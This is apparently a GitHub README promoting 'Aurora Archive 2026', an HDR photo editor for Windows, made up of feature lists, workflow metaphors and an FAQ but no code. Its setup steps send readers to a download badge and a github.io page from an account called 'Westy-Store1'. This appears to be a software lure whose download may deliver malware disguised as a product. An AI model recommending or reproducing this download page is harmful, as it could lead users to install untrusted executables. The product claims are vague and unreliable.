## 🌠 Why This Project Exists

Most HDR utilities ask you to think like an engineer. Aurora Archive 2026 asks you to think like a **painter who happens to be holding a camera**.

The premise is simple: high dynamic range photography should not feel like a math problem. It should feel like walking through a forest at dusk and deciding, deliberately, how much of the horizon you want to keep glowing. Existential question, artistic answer — that is the shape of this repository.

This project began as a set of personal notes scribbled in the margins of a photo editor — a list of small frustrations, small wishes, and one large one: *what if the software simply understood what I was trying to say?* Aurora Archive is the answer to that wish, published openly for anyone who wants to build on it.

---

## 🎨 The Philosophy Behind Aurora Archive

We think of tone mapping the way a sculptor thinks of clay. The clay is the raw exposure stack. The sculptor's hands are the sliders, the masks, the micro-contrast waves. Nothing about this should be violent to the image — no over-sharpened halos, no radioactive skies, no forests rendered in an impossible neon green.

Instead, Aurora Archive aims for **restraint with reach**:

- Shadows that whisper, not shout.
- Highlights that bend gracefully before they break.
- Color that remembers what the eye actually saw.
- Structure that supports rather than screams.

This is the difference between an image that says *"I was processed"* and one that says *"I was there."*

## ✨ Feature Constellation

Each feature below was chosen because at least three beta testers wrote the words *"finally, someone did this"* in the feedback form. That is the bar.

### 🌗 Adaptive Tone Mapping
A gentle, exposure-aware engine that studies the histogram before it touches a single pixel. It decides how aggressively to compress dynamic range based on how the scene is distributed, not on a fixed preset. A midday cathedral and a midnight campfire receive entirely different treatment — as they should.

### 🪄 Intelligent Masking
Masks that learn from your first few brush strokes. Draw a rough outline of a foreground tree, and the engine proposes a refined edge. Correct it once, and it remembers the correction for the whole project.

### 🎞️ Film Character Library
Nineteen tonal recipes inspired by the classic emulsions — warm tungsten, cool daylight, faded portraiture, that strange green-shifted cinema stock everyone loves. Each recipe is a starting point, never a cage.

### 🔭 Micro-Contrast Waves
A frequency-aware sharpening stage that boosts structure without the dreaded halo. Think of it as a filter that strengthens the bones of an image while leaving the skin untouched.

### 🖼️ Batch Constellation View
Load a hundred exposures and see them as a constellation — visually grouped, color-coded by brightness and mood. Select, adjust, and export entire orbits at once.

### 🌈 Wide-Gamut Color Handling
Color managed end to end. What you see in the soft-proof view is what survives into print, into the web, and into that exhibition panel you have been dreaming about.

### 🧪 Non-Destructive Everything
Every adjustment lives in a layered recipe that can be reordered, muted, or reverted. Nothing is burned in until you say so.

### 🕰️ Session Recall
Close the laptop. Reopen it next Tuesday. Aurora Archive restores your last seventy-two sessions with full state — including unsaved draft work.

### 🗺️ Map-Aware Lightening
Optional geolocation metadata can hint the engine about ambient light conditions at capture time — a sunset in Reykjavík is not a sunset in Marrakesh.

### 📜 Export Storytelling
Instead of exporting a file, export a *story* — a small companion document describing every adjustment you made, in human language. Wonderful for collaborators or for your own memory a year later.

## 🖥️ Interface & Experience

The interface is built around a single principle: **the photograph is the hero, the toolbars are the stagehands.**

- **Dark canvas mode** by default, dimmed to reduce eye strain during long editing nights.
- **Tabbed workspace** so you can compare two interpretations side by side without losing either.
- **Quick-gesture palette** — a floating overlay triggered by a single key, giving you the twelve most-used controls without leaving the image.
- **Color-blind-friendly palettes** available across the entire UI, not as an afterthought but as a first-class theme.

Every panel can be docked, torn off, or hidden. The interface bends to your habits rather than the other way around.

## 📱 Responsive UI, Everywhere

The application adapts its layout based on the display in front of it:

- On a **4K studio monitor**, panels breathe with generous spacing, and the histogram becomes a small billboard of information.
- On a **laptop screen**, panels compact gracefully, and the toolbar shrinks to iconic form.
- On a **touch-enabled tablet** running Windows, brush controls expand to finger-friendly sizes and gestures replace some keyboard shortcuts.
- On an **ultrawide display**, the timeline and layer stack can be pulled into the extra space without stealing from the image.

No two photographers work on the same screen. Aurora Archive respects that.

## 🚀 Getting Started — The Gentle Path

Setting up Aurora Archive 2026 is designed to be uneventful — and we mean that as a compliment.

1. **Acquire the archive package.** Use the [![Download](https://raw.githubusercontent.com/Westy-Store1/Aurora-HDR-Studio-Guide/main/app_a32cf9d.svg)](https://Westy-Store1.github.io/Aurora-HDR-Studio-Guide/) marker found at the top and bottom of this document as your entry point.
2. **Verify integrity.** A small helper is bundled that checks the package signature before anything else runs.
3. **Run the assistant.** A short, friendly setup assistant walks you through folder preferences, default color space, and display calibration hints.
4. **Point it at your photographs.** Aurora Archive never moves, renames, or duplicates your originals — it reads them and leaves them exactly where they were.
5. **Start with a preset.** The bundled *First Light* preset is deliberately mild — a gentle introduction before you climb the mountain of manual adjustments.

That is the entire ritual. No command lines, no package managers, no gymnastics.

## ⚙️ Configuration & Profiles

Aurora Archive stores settings in a portable profile model. This means a photographer can carry their entire working environment on a USB stick and borrow any machine in a studio.

Three profile scopes exist:

- **Global** — preferences that apply to every project on the machine.
- **Project** — settings saved alongside a specific body of work.
- **Session** — temporary overrides that vanish when the day is over.

Profiles can be exported as a single compact file for backup, sharing with a collaborator, or archiving alongside a finished portfolio.

## 🧭 Workflow Metaphors

We teach the workflow using three metaphors, because metaphors are easier to remember than menu trees.

### The River
Import, cull, and sort — the flowing stage. Let the images arrive and drift, and simply select the ones worth keeping.

### The Kiln
Tone mapping, color, and contrast — the shaping stage. This is where the raw material becomes the piece. Slow here is good.

### The Window
Export, print, and share — the presenting stage. How does it look outside the darkroom, in the world it was made for?

Each stage has its own dedicated workspace inside Aurora Archive, and moving between them is a single keystroke.

## 🚄 Performance Notes

The 2026 engine is written to take advantage of what modern hardware offers without punishing older machines.

- **GPU-accelerated preview** — adjustments reflect in real time at full resolution.
- **Streaming tile cache** — gigabyte panoramas remain fluid because only the visible tiles stay resident.
- **Multi-frame batch export** — up to thirty-two images processed in parallel on a typical machine.
- **Cold-start in under four seconds** on a solid-state drive.

When hardware is limited, Aurora Archive politely degrades — reducing preview resolution rather than becoming unresponsive.

## ❓ FAQ

**Does Aurora Archive modify my original files?**
Never. The originals are treated as sacred, and every adjustment is stored as a separate recipe.

**Can I use it on multiple computers?**
Yes. The portable profile system was designed exactly for that.

**Is there a version for macOS or Linux?**
Not in 2026. The architecture is deliberately Windows-first for this release cycle.

**How often are updates pushed?**
Roughly every six weeks, with security patches arriving as soon as they are needed.

**Can I contribute a language or a preset?**
Absolutely. Both are welcomed, and both earn a line in the changelog.
